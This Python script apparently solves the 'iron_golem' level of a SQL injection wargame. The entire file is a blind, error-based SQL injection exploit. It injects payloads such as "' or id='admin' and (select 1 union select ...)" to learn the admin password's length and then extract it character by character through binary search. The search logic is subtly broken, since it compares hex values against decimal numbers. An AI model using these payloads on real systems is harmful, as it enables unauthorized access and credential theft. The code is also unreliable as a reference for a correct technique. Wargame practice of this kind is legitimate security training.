import requests

url = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php"
cookies = { "PHPSESSID" : "쿠키값" }

def pw_length():
    length = 1

    while True:
        params = { "pw" : "' or id='admin' and (select 1 union select length(pw)={}) #".format(length) }
        request = requests.get(url, params=params, cookies=cookies)

        if "select id from prob_iron_golem" in request.text:
            return length
        else:
            length += 1

def pw_crack():
    password_length = pw_length()
    password = ''

    for i in range(1, password_length+1):
        start, end, mid = 1, 127, 64
        while True:
            params = { "pw" : "' or id='admin' and (select 1 union select hex(mid(pw, {}, 1)) in ({})) #".format(i, mid) }
            request = requests.get(url, params=params, cookies=cookies)

            if "select id from prob_iron_golem" in request.text:
                password = password + chr(int(str(mid), 16))
                print("패스워드:", password)
                break
            else:
                params = { "pw" : "' or id='admin' and (select 1 union select hex(mid(pw, {}, 1)) > {}) #".format(i, mid) }
                request = requests.get(url, params=params, cookies=cookies)

                if "select id from prob_iron_golem" in request.text:
                    start = mid
                    mid = (mid + end) // 2
                else:
                    end = mid
                    mid = (start + end) // 2

pw_crack()
